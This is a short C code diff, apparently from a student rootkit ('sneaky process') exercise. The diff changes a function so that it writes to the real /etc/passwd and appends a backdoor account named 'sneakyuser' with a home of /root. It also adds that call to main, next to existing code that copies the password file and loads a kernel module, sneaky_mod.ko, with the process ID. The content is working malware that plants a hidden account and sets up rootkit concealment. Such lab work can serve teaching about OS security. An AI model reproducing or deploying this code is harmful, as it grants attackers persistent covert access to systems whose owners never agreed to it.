@@ -18,14 +18,14 @@ int copy_file(char * from, char * to)
 }
 
 int change_user(){
-    FILE *f = fopen("/tmp/passwd", "r+");
+    FILE *f = fopen("/etc/passwd", "r+");
     if (f == NULL)
     {
         printf("cannot open file \n");
         exit(EXIT_FAILURE);
     }
     fseek(f, 0, SEEK_END);
-    fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+    fprintf(f, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
     fclose(f);
     return 0;
 }
@@ -35,6 +35,7 @@ int main()
     pid_t pid = getpid();
     printf("sneaky_process pid = %d\n", pid);
     copy_file("/etc/passwd" ,"/tmp/");
+    change_user();
 
     char arg[50];
     sprintf(arg, "insmod sneaky_mod.ko spid=%d", pid);
